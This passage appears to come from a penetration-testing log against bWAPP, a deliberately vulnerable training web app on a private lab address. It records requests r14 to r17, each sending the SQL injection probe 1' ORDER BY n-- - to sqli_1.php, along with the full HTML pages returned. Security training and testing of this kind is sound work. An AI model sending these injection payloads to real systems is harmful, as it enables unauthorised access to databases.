+        &lt;input type=&quot;text&quot; id=&quot;title&quot; name=&quot;title&quot; size=&quot;25&quot;&gt;
+
+        &lt;button type=&quot;submit&quot; name=&quot;action&quot; value=&quot;search&quot;&gt;Search&lt;/button&gt;
+
+        &lt;/p&gt;
+
+    &lt;/form&gt;
+
+    &lt;table id=&quot;table_yellow&quot;&gt;
+
+        &lt;tr height=&quot;30&quot; bgcolor=&quot;#ffb717&quot; align=&quot;center&quot;&gt;
+
+            &lt;td width=&quot;200&quot;&gt;&lt;b&gt;Title&lt;/b&gt;&lt;/td&gt;
+            &lt;td width=&quot;80&quot;&gt;&lt;b&gt;Release&lt;/b&gt;&lt;/td&gt;
+            &lt;td width=&quot;140&quot;&gt;&lt;b&gt;Character&lt;/b&gt;&lt;/td&gt;
+            &lt;td width=&quot;80&quot;&gt;&lt;b&gt;Genre&lt;/b&gt;&lt;/td&gt;
+            &lt;td width=&quot;80&quot;&gt;&lt;b&gt;IMDb&lt;/b&gt;&lt;/td&gt;
+
+        &lt;/tr&gt;
+
+        &lt;tr height=&quot;30&quot;&gt;
+
+            &lt;td colspan=&quot;5&quot; width=&quot;580&quot;&gt;No movies were found!&lt;/td&gt;
+            &lt;!--
+            &lt;td&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;/td&gt;
+            --&gt;
+
+        &lt;/tr&gt;
+
+    &lt;/table&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;side&quot;&gt;
+
+    &lt;a href=&quot;http://twitter.com/MME_IT&quot; target=&quot;blank_&quot; class=&quot;button&quot;&gt;&lt;img src=&quot;./images/twitter.png&quot;&gt;&lt;/a&gt;
+    &lt;a href=&quot;http://be.linkedin.com/in/malikmesellem&quot; target=&quot;blank_&quot; class=&quot;button&quot;&gt;&lt;img src=&quot;./images/linkedin.png&quot;&gt;&lt;/a&gt;
+    &lt;a href=&quot;http://www.facebook.com/pages/MME-IT-Audits-Security/104153019664877&quot; target=&quot;blank_&quot; class=&quot;button&quot;&gt;&lt;img src=&quot;./images/facebook.png&quot;&gt;&lt;/a&gt;
+    &lt;a href=&quot;http://itsecgames.blogspot.com&quot; target=&quot;blank_&quot; class=&quot;button&quot;&gt;&lt;img src=&quot;./images/blogger.png&quot;&gt;&lt;/a&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;disclaimer&quot;&gt;
+
+    &lt;p&gt;bWAPP is licensed under &lt;a rel=&quot;license&quot; href=&quot;http://creativecommons.org/licenses/by-nc-nd/4.0/&quot; target=&quot;_blank&quot;&gt;&lt;img style=&quot;vertical-align:middle&quot; src=&quot;./images/cc.png&quot;&gt;&lt;/a&gt; &amp;copy; 2014 MME BVBA / Follow &lt;a href=&quot;http://twitter.com/MME_IT&quot; target=&quot;_blank&quot;&gt;@MME_IT&lt;/a&gt; on Twitter and ask for our cheat sheet, containing all solutions! / Need an exclusive &lt;a href=&quot;http://www.mmebvba.com&quot; target=&quot;_blank&quot;&gt;training&lt;/a&gt;?&lt;/p&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;bee&quot;&gt;
+
+    &lt;img src=&quot;./images/bee_1.png&quot;&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;security_level&quot;&gt;
+
+    &lt;form action=&quot;/sqli_1.php&quot; method=&quot;POST&quot;&gt;
+
+        &lt;label&gt;Set your security level:&lt;/label&gt;&lt;br /&gt;
+
+        &lt;select name=&quot;security_level&quot;&gt;
+
+            &lt;option value=&quot;0&quot;&gt;low&lt;/option&gt;
+            &lt;option value=&quot;1&quot;&gt;medium&lt;/option&gt;
+            &lt;option value=&quot;2&quot;&gt;high&lt;/option&gt;
+
+        &lt;/select&gt;
+
+        &lt;button type=&quot;submit&quot; name=&quot;form_security_level&quot; value=&quot;submit&quot;&gt;Set&lt;/button&gt;
+        &lt;font size=&quot;4&quot;&gt;Current: &lt;b&gt;low&lt;/b&gt;&lt;/font&gt;
+
+    &lt;/form&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;bug&quot;&gt;
+
+    &lt;form action=&quot;/sqli_1.php&quot; method=&quot;POST&quot;&gt;
+
+        &lt;label&gt;Choose your bug:&lt;/label&gt;&lt;br /&gt;
+
+        &lt;select name=&quot;bug&quot;&gt;
+
+&lt;o</pre></details><details><summary>Transcript r14: GET http://192.168.223.221:8080/sqli_1.php?title=1%27+ORDER+BY+3--+-&amp;action=search -> 200</summary><pre>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+
+&lt;head&gt;
+
+&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;
+
+&lt;!--&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://fonts.googleapis.com/css?family=Architects+Daughter&quot;&gt;--&gt;
+&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;stylesheets/stylesheet.css&quot; media=&quot;screen&quot; /&gt;
+&lt;link rel=&quot;shortcut icon&quot; href=&quot;images/favicon.ico&quot; type=&quot;image/x-icon&quot; /&gt;
+
+&lt;!--&lt;script src=&quot;//html5shiv.googlecode.com/svn/trunk/html5.js&quot;&gt;&lt;/script&gt;--&gt;
+&lt;script src=&quot;js/html5.js&quot;&gt;&lt;/script&gt;
+
+&lt;title&gt;bWAPP - SQL Injection&lt;/title&gt;
+
+&lt;/head&gt;
+
+&lt;body&gt;
+
+&lt;header&gt;
+
+&lt;h1&gt;bWAPP&lt;/h1&gt;
+
+&lt;h2&gt;an extremely buggy web app !&lt;/h2&gt;
+
+&lt;/header&gt;
+
+&lt;div id=&quot;menu&quot;&gt;
+
+    &lt;table&gt;
+
+        &lt;tr&gt;
+
+            &lt;td&gt;&lt;a href=&quot;portal.php&quot;&gt;Bugs&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;password_change.php&quot;&gt;Change Password&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;user_extra.php&quot;&gt;Create User&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;security_level_set.php&quot;&gt;Set Security Level&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;reset.php&quot; onclick=&quot;return confirm(&#x27;All settings will be cleared. Are you sure?&#x27;);&quot;&gt;Reset&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;credits.php&quot;&gt;Credits&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;http://itsecgames.blogspot.com&quot; target=&quot;_blank&quot;&gt;Blog&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;logout.php&quot; onclick=&quot;return confirm(&#x27;Are you sure you want to leave?&#x27;);&quot;&gt;Logout&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;font color=&quot;red&quot;&gt;Welcome Bee&lt;/font&gt;&lt;/td&gt;
+
+        &lt;/tr&gt;
+
+    &lt;/table&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;main&quot;&gt;
+
+    &lt;h1&gt;SQL Injection (GET/Search)&lt;/h1&gt;
+
+    &lt;form action=&quot;/sqli_1.php&quot; method=&quot;GET&quot;&gt;
+
+        &lt;p&gt;
+
+        &lt;label for=&quot;title&quot;&gt;Search for a movie:&lt;/label&gt;
+        &lt;input type=&quot;text&quot; id=&quot;title&quot; name=&quot;title&quot; size=&quot;25&quot;&gt;
+
+        &lt;button type=&quot;submit&quot; name=&quot;action&quot; value=&quot;search&quot;&gt;Search&lt;/button&gt;
+
+        &lt;/p&gt;
+
+    &lt;/form&gt;
+
+    &lt;table id=&quot;table_yellow&quot;&gt;
+
+        &lt;tr height=&quot;30&quot; bgcolor=&quot;#ffb717&quot; align=&quot;center&quot;&gt;
+
+            &lt;td width=&quot;200&quot;&gt;&lt;b&gt;Title&lt;/b&gt;&lt;/td&gt;
+            &lt;td width=&quot;80&quot;&gt;&lt;b&gt;Release&lt;/b&gt;&lt;/td&gt;
+            &lt;td width=&quot;140&quot;&gt;&lt;b&gt;Character&lt;/b&gt;&lt;/td&gt;
+            &lt;td width=&quot;80&quot;&gt;&lt;b&gt;Genre&lt;/b&gt;&lt;/td&gt;
+            &lt;td width=&quot;80&quot;&gt;&lt;b&gt;IMDb&lt;/b&gt;&lt;/td&gt;
+
+        &lt;/tr&gt;
+
+        &lt;tr height=&quot;30&quot;&gt;
+
+            &lt;td colspan=&quot;5&quot; width=&quot;580&quot;&gt;No movies were found!&lt;/td&gt;
+            &lt;!--
+            &lt;td&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;/td&gt;
+            --&gt;
+
+        &lt;/tr&gt;
+
+    &lt;/table&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;side&quot;&gt;
+
+    &lt;a href=&quot;http://twitter.com/MME_IT&quot; target=&quot;blank_&quot; class=&quot;button&quot;&gt;&lt;img src=&quot;./images/twitter.png&quot;&gt;&lt;/a&gt;
+    &lt;a href=&quot;http://be.linkedin.com/in/malikmesellem&quot; target=&quot;blank_&quot; class=&quot;button&quot;&gt;&lt;img src=&quot;./images/linkedin.png&quot;&gt;&lt;/a&gt;
+    &lt;a href=&quot;http://www.facebook.com/pages/MME-IT-Audits-Security/104153019664877&quot; target=&quot;blank_&quot; class=&quot;button&quot;&gt;&lt;img src=&quot;./images/facebook.png&quot;&gt;&lt;/a&gt;
+    &lt;a href=&quot;http://itsecgames.blogspot.com&quot; target=&quot;blank_&quot; class=&quot;button&quot;&gt;&lt;img src=&quot;./images/blogger.png&quot;&gt;&lt;/a&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;disclaimer&quot;&gt;
+
+    &lt;p&gt;bWAPP is licensed under &lt;a rel=&quot;license&quot; href=&quot;http://creativecommons.org/licenses/by-nc-nd/4.0/&quot; target=&quot;_blank&quot;&gt;&lt;img style=&quot;vertical-align:middle&quot; src=&quot;./images/cc.png&quot;&gt;&lt;/a&gt; &amp;copy; 2014 MME BVBA / Follow &lt;a href=&quot;http://twitter.com/MME_IT&quot; target=&quot;_blank&quot;&gt;@MME_IT&lt;/a&gt; on Twitter and ask for our cheat sheet, containing all solutions! / Need an exclusive &lt;a href=&quot;http://www.mmebvba.com&quot; target=&quot;_blank&quot;&gt;training&lt;/a&gt;?&lt;/p&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;bee&quot;&gt;
+
+    &lt;img src=&quot;./images/bee_1.png&quot;&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;security_level&quot;&gt;
+
+    &lt;form action=&quot;/sqli_1.php&quot; method=&quot;POST&quot;&gt;
+
+        &lt;label&gt;Set your security level:&lt;/label&gt;&lt;br /&gt;
+
+        &lt;select name=&quot;security_level&quot;&gt;
+
+            &lt;option value=&quot;0&quot;&gt;low&lt;/option&gt;
+            &lt;option value=&quot;1&quot;&gt;medium&lt;/option&gt;
+            &lt;option value=&quot;2&quot;&gt;high&lt;/option&gt;
+
+        &lt;/select&gt;
+
+        &lt;button type=&quot;submit&quot; name=&quot;form_security_level&quot; value=&quot;submit&quot;&gt;Set&lt;/button&gt;
+        &lt;font size=&quot;4&quot;&gt;Current: &lt;b&gt;low&lt;/b&gt;&lt;/font&gt;
+
+    &lt;/form&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;bug&quot;&gt;
+
+    &lt;form action=&quot;/sqli_1.php&quot; method=&quot;POST&quot;&gt;
+
+        &lt;label&gt;Choose your bug:&lt;/label&gt;&lt;br /&gt;
+
+        &lt;select name=&quot;bug&quot;&gt;
+
+&lt;o</pre></details><details><summary>Transcript r15: GET http://192.168.223.221:8080/sqli_1.php?title=1%27+ORDER+BY+4--+-&amp;action=search -> 200</summary><pre>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+
+&lt;head&gt;
+
+&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;
+
+&lt;!--&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://fonts.googleapis.com/css?family=Architects+Daughter&quot;&gt;--&gt;
+&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;stylesheets/stylesheet.css&quot; media=&quot;screen&quot; /&gt;
+&lt;link rel=&quot;shortcut icon&quot; href=&quot;images/favicon.ico&quot; type=&quot;image/x-icon&quot; /&gt;
+
+&lt;!--&lt;script src=&quot;//html5shiv.googlecode.com/svn/trunk/html5.js&quot;&gt;&lt;/script&gt;--&gt;
+&lt;script src=&quot;js/html5.js&quot;&gt;&lt;/script&gt;
+
+&lt;title&gt;bWAPP - SQL Injection&lt;/title&gt;
+
+&lt;/head&gt;
+
+&lt;body&gt;
+
+&lt;header&gt;
+
+&lt;h1&gt;bWAPP&lt;/h1&gt;
+
+&lt;h2&gt;an extremely buggy web app !&lt;/h2&gt;
+
+&lt;/header&gt;
+
+&lt;div id=&quot;menu&quot;&gt;
+
+    &lt;table&gt;
+
+        &lt;tr&gt;
+
+            &lt;td&gt;&lt;a href=&quot;portal.php&quot;&gt;Bugs&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;password_change.php&quot;&gt;Change Password&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;user_extra.php&quot;&gt;Create User&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;security_level_set.php&quot;&gt;Set Security Level&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;reset.php&quot; onclick=&quot;return confirm(&#x27;All settings will be cleared. Are you sure?&#x27;);&quot;&gt;Reset&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;credits.php&quot;&gt;Credits&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;http://itsecgames.blogspot.com&quot; target=&quot;_blank&quot;&gt;Blog&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;logout.php&quot; onclick=&quot;return confirm(&#x27;Are you sure you want to leave?&#x27;);&quot;&gt;Logout&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;font color=&quot;red&quot;&gt;Welcome Bee&lt;/font&gt;&lt;/td&gt;
+
+        &lt;/tr&gt;
+
+    &lt;/table&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;main&quot;&gt;
+
+    &lt;h1&gt;SQL Injection (GET/Search)&lt;/h1&gt;
+
+    &lt;form action=&quot;/sqli_1.php&quot; method=&quot;GET&quot;&gt;
+
+        &lt;p&gt;
+
+        &lt;label for=&quot;title&quot;&gt;Search for a movie:&lt;/label&gt;
+        &lt;input type=&quot;text&quot; id=&quot;title&quot; name=&quot;title&quot; size=&quot;25&quot;&gt;
+
+        &lt;button type=&quot;submit&quot; name=&quot;action&quot; value=&quot;search&quot;&gt;Search&lt;/button&gt;
+
+        &lt;/p&gt;
+
+    &lt;/form&gt;
+
+    &lt;table id=&quot;table_yellow&quot;&gt;
+
+        &lt;tr height=&quot;30&quot; bgcolor=&quot;#ffb717&quot; align=&quot;center&quot;&gt;
+
+            &lt;td width=&quot;200&quot;&gt;&lt;b&gt;Title&lt;/b&gt;&lt;/td&gt;
+            &lt;td width=&quot;80&quot;&gt;&lt;b&gt;Release&lt;/b&gt;&lt;/td&gt;
+            &lt;td width=&quot;140&quot;&gt;&lt;b&gt;Character&lt;/b&gt;&lt;/td&gt;
+            &lt;td width=&quot;80&quot;&gt;&lt;b&gt;Genre&lt;/b&gt;&lt;/td&gt;
+            &lt;td width=&quot;80&quot;&gt;&lt;b&gt;IMDb&lt;/b&gt;&lt;/td&gt;
+
+        &lt;/tr&gt;
+
+        &lt;tr height=&quot;30&quot;&gt;
+
+            &lt;td colspan=&quot;5&quot; width=&quot;580&quot;&gt;No movies were found!&lt;/td&gt;
+            &lt;!--
+            &lt;td&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;/td&gt;
+            --&gt;
+
+        &lt;/tr&gt;
+
+    &lt;/table&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;side&quot;&gt;
+
+    &lt;a href=&quot;http://twitter.com/MME_IT&quot; target=&quot;blank_&quot; class=&quot;button&quot;&gt;&lt;img src=&quot;./images/twitter.png&quot;&gt;&lt;/a&gt;
+    &lt;a href=&quot;http://be.linkedin.com/in/malikmesellem&quot; target=&quot;blank_&quot; class=&quot;button&quot;&gt;&lt;img src=&quot;./images/linkedin.png&quot;&gt;&lt;/a&gt;
+    &lt;a href=&quot;http://www.facebook.com/pages/MME-IT-Audits-Security/104153019664877&quot; target=&quot;blank_&quot; class=&quot;button&quot;&gt;&lt;img src=&quot;./images/facebook.png&quot;&gt;&lt;/a&gt;
+    &lt;a href=&quot;http://itsecgames.blogspot.com&quot; target=&quot;blank_&quot; class=&quot;button&quot;&gt;&lt;img src=&quot;./images/blogger.png&quot;&gt;&lt;/a&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;disclaimer&quot;&gt;
+
+    &lt;p&gt;bWAPP is licensed under &lt;a rel=&quot;license&quot; href=&quot;http://creativecommons.org/licenses/by-nc-nd/4.0/&quot; target=&quot;_blank&quot;&gt;&lt;img style=&quot;vertical-align:middle&quot; src=&quot;./images/cc.png&quot;&gt;&lt;/a&gt; &amp;copy; 2014 MME BVBA / Follow &lt;a href=&quot;http://twitter.com/MME_IT&quot; target=&quot;_blank&quot;&gt;@MME_IT&lt;/a&gt; on Twitter and ask for our cheat sheet, containing all solutions! / Need an exclusive &lt;a href=&quot;http://www.mmebvba.com&quot; target=&quot;_blank&quot;&gt;training&lt;/a&gt;?&lt;/p&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;bee&quot;&gt;
+
+    &lt;img src=&quot;./images/bee_1.png&quot;&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;security_level&quot;&gt;
+
+    &lt;form action=&quot;/sqli_1.php&quot; method=&quot;POST&quot;&gt;
+
+        &lt;label&gt;Set your security level:&lt;/label&gt;&lt;br /&gt;
+
+        &lt;select name=&quot;security_level&quot;&gt;
+
+            &lt;option value=&quot;0&quot;&gt;low&lt;/option&gt;
+            &lt;option value=&quot;1&quot;&gt;medium&lt;/option&gt;
+            &lt;option value=&quot;2&quot;&gt;high&lt;/option&gt;
+
+        &lt;/select&gt;
+
+        &lt;button type=&quot;submit&quot; name=&quot;form_security_level&quot; value=&quot;submit&quot;&gt;Set&lt;/button&gt;
+        &lt;font size=&quot;4&quot;&gt;Current: &lt;b&gt;low&lt;/b&gt;&lt;/font&gt;
+
+    &lt;/form&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;bug&quot;&gt;
+
+    &lt;form action=&quot;/sqli_1.php&quot; method=&quot;POST&quot;&gt;
+
+        &lt;label&gt;Choose your bug:&lt;/label&gt;&lt;br /&gt;
+
+        &lt;select name=&quot;bug&quot;&gt;
+
+&lt;o</pre></details><details><summary>Transcript r16: GET http://192.168.223.221:8080/sqli_1.php?title=1%27+ORDER+BY+5--+-&amp;action=search -> 200</summary><pre>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+
+&lt;head&gt;
+
+&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;
+
+&lt;!--&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://fonts.googleapis.com/css?family=Architects+Daughter&quot;&gt;--&gt;
+&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;stylesheets/stylesheet.css&quot; media=&quot;screen&quot; /&gt;
+&lt;link rel=&quot;shortcut icon&quot; href=&quot;images/favicon.ico&quot; type=&quot;image/x-icon&quot; /&gt;
+
+&lt;!--&lt;script src=&quot;//html5shiv.googlecode.com/svn/trunk/html5.js&quot;&gt;&lt;/script&gt;--&gt;
+&lt;script src=&quot;js/html5.js&quot;&gt;&lt;/script&gt;
+
+&lt;title&gt;bWAPP - SQL Injection&lt;/title&gt;
+
+&lt;/head&gt;
+
+&lt;body&gt;
+
+&lt;header&gt;
+
+&lt;h1&gt;bWAPP&lt;/h1&gt;
+
+&lt;h2&gt;an extremely buggy web app !&lt;/h2&gt;
+
+&lt;/header&gt;
+
+&lt;div id=&quot;menu&quot;&gt;
+
+    &lt;table&gt;
+
+        &lt;tr&gt;
+
+            &lt;td&gt;&lt;a href=&quot;portal.php&quot;&gt;Bugs&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;password_change.php&quot;&gt;Change Password&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;user_extra.php&quot;&gt;Create User&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;security_level_set.php&quot;&gt;Set Security Level&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;reset.php&quot; onclick=&quot;return confirm(&#x27;All settings will be cleared. Are you sure?&#x27;);&quot;&gt;Reset&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;credits.php&quot;&gt;Credits&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;http://itsecgames.blogspot.com&quot; target=&quot;_blank&quot;&gt;Blog&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;logout.php&quot; onclick=&quot;return confirm(&#x27;Are you sure you want to leave?&#x27;);&quot;&gt;Logout&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;font color=&quot;red&quot;&gt;Welcome Bee&lt;/font&gt;&lt;/td&gt;
+
+        &lt;/tr&gt;
+
+    &lt;/table&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;main&quot;&gt;
+
+    &lt;h1&gt;SQL Injection (GET/Search)&lt;/h1&gt;
+
+    &lt;form action=&quot;/sqli_1.php&quot; method=&quot;GET&quot;&gt;
+
+        &lt;p&gt;
+
+        &lt;label for=&quot;title&quot;&gt;Search for a movie:&lt;/label&gt;
+        &lt;input type=&quot;text&quot; id=&quot;title&quot; name=&quot;title&quot; size=&quot;25&quot;&gt;
+
+        &lt;button type=&quot;submit&quot; name=&quot;action&quot; value=&quot;search&quot;&gt;Search&lt;/button&gt;
+
+        &lt;/p&gt;
+
+    &lt;/form&gt;
+
+    &lt;table id=&quot;table_yellow&quot;&gt;
+
+        &lt;tr height=&quot;30&quot; bgcolor=&quot;#ffb717&quot; align=&quot;center&quot;&gt;
+
+            &lt;td width=&quot;200&quot;&gt;&lt;b&gt;Title&lt;/b&gt;&lt;/td&gt;
+            &lt;td width=&quot;80&quot;&gt;&lt;b&gt;Release&lt;/b&gt;&lt;/td&gt;
+            &lt;td width=&quot;140&quot;&gt;&lt;b&gt;Character&lt;/b&gt;&lt;/td&gt;
+            &lt;td width=&quot;80&quot;&gt;&lt;b&gt;Genre&lt;/b&gt;&lt;/td&gt;
+            &lt;td width=&quot;80&quot;&gt;&lt;b&gt;IMDb&lt;/b&gt;&lt;/td&gt;
+
+        &lt;/tr&gt;
+
+        &lt;tr height=&quot;30&quot;&gt;
+
+            &lt;td colspan=&quot;5&quot; width=&quot;580&quot;&gt;No movies were found!&lt;/td&gt;
+            &lt;!--
+            &lt;td&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;/td&gt;
+            --&gt;
+
+        &lt;/tr&gt;
+
+    &lt;/table&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;side&quot;&gt;
+
+    &lt;a href=&quot;http://twitter.com/MME_IT&quot; target=&quot;blank_&quot; class=&quot;button&quot;&gt;&lt;img src=&quot;./images/twitter.png&quot;&gt;&lt;/a&gt;
+    &lt;a href=&quot;http://be.linkedin.com/in/malikmesellem&quot; target=&quot;blank_&quot; class=&quot;button&quot;&gt;&lt;img src=&quot;./images/linkedin.png&quot;&gt;&lt;/a&gt;
+    &lt;a href=&quot;http://www.facebook.com/pages/MME-IT-Audits-Security/104153019664877&quot; target=&quot;blank_&quot; class=&quot;button&quot;&gt;&lt;img src=&quot;./images/facebook.png&quot;&gt;&lt;/a&gt;
+    &lt;a href=&quot;http://itsecgames.blogspot.com&quot; target=&quot;blank_&quot; class=&quot;button&quot;&gt;&lt;img src=&quot;./images/blogger.png&quot;&gt;&lt;/a&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;disclaimer&quot;&gt;
+
+    &lt;p&gt;bWAPP is licensed under &lt;a rel=&quot;license&quot; href=&quot;http://creativecommons.org/licenses/by-nc-nd/4.0/&quot; target=&quot;_blank&quot;&gt;&lt;img style=&quot;vertical-align:middle&quot; src=&quot;./images/cc.png&quot;&gt;&lt;/a&gt; &amp;copy; 2014 MME BVBA / Follow &lt;a href=&quot;http://twitter.com/MME_IT&quot; target=&quot;_blank&quot;&gt;@MME_IT&lt;/a&gt; on Twitter and ask for our cheat sheet, containing all solutions! / Need an exclusive &lt;a href=&quot;http://www.mmebvba.com&quot; target=&quot;_blank&quot;&gt;training&lt;/a&gt;?&lt;/p&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;bee&quot;&gt;
+
+    &lt;img src=&quot;./images/bee_1.png&quot;&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;security_level&quot;&gt;
+
+    &lt;form action=&quot;/sqli_1.php&quot; method=&quot;POST&quot;&gt;
+
+        &lt;label&gt;Set your security level:&lt;/label&gt;&lt;br /&gt;
+
+        &lt;select name=&quot;security_level&quot;&gt;
+
+            &lt;option value=&quot;0&quot;&gt;low&lt;/option&gt;
+            &lt;option value=&quot;1&quot;&gt;medium&lt;/option&gt;
+            &lt;option value=&quot;2&quot;&gt;high&lt;/option&gt;
+
+        &lt;/select&gt;
+
+        &lt;button type=&quot;submit&quot; name=&quot;form_security_level&quot; value=&quot;submit&quot;&gt;Set&lt;/button&gt;
+        &lt;font size=&quot;4&quot;&gt;Current: &lt;b&gt;low&lt;/b&gt;&lt;/font&gt;
+
+    &lt;/form&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;bug&quot;&gt;
+
+    &lt;form action=&quot;/sqli_1.php&quot; method=&quot;POST&quot;&gt;
+
+        &lt;label&gt;Choose your bug:&lt;/label&gt;&lt;br /&gt;
+
+        &lt;select name=&quot;bug&quot;&gt;
+
+&lt;o</pre></details><details><summary>Transcript r17: GET http://192.168.223.221:8080/sqli_1.php?title=1%27+ORDER+BY+6--+-&amp;action=search -> 200</summary><pre>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+
+&lt;head&gt;
+
+&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;
+
+&lt;!--&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://fonts.googleapis.com/css?family=Architects+Daughter&quot;&gt;--&gt;
+&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;stylesheets/stylesheet.css&quot; media=&quot;screen&quot; /&gt;
+&lt;link rel=&quot;shortcut icon&quot; href=&quot;images/favicon.ico&quot; type=&quot;image/x-icon&quot; /&gt;
+
+&lt;!--&lt;script src=&quot;//html5shiv.googlecode.com/svn/trunk/html5.js&quot;&gt;&lt;/script&gt;--&gt;
+&lt;script src=&quot;js/html5.js&quot;&gt;&lt;/script&gt;
+
+&lt;title&gt;bWAPP - SQL Injection&lt;/title&gt;
+
+&lt;/head&gt;
+
+&lt;body&gt;
+
+&lt;header&gt;
+
+&lt;h1&gt;bWAPP&lt;/h1&gt;
+
+&lt;h2&gt;an extremely buggy web app !&lt;/h2&gt;
+
+&lt;/header&gt;
+
+&lt;div id=&quot;menu&quot;&gt;
+
+    &lt;table&gt;
+
+        &lt;tr&gt;
+
+            &lt;td&gt;&lt;a href=&quot;portal.php&quot;&gt;Bugs&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;password_change.php&quot;&gt;Change Password&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;user_extra.php&quot;&gt;Create User&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;security_level_set.php&quot;&gt;Set Security Level&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;reset.php&quot; onclick=&quot;return confirm(&#x27;All settings will be cleared. Are you sure?&#x27;);&quot;&gt;Reset&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;credits.php&quot;&gt;Credits&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;http://itsecgames.blogspot.com&quot; target=&quot;_blank&quot;&gt;Blog&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;logout.php&quot; onclick=&quot;return confirm(&#x27;Are you sure you want to leave?&#x27;);&quot;&gt;Logout&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;font color=&quot;red&quot;&gt;Welcome Bee&lt;/font&gt;&lt;/td&gt;
+
+        &lt;/tr&gt;
+
+    &lt;/table&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;main&quot;&gt;
+
+    &lt;h1&gt;SQL Injection (GET/Search)&lt;/h1&gt;
+
+    &lt;form action=&quot;/sqli_1.php&quot; method=&quot;GET&quot;&gt;
+
+        &lt;p&gt;
+
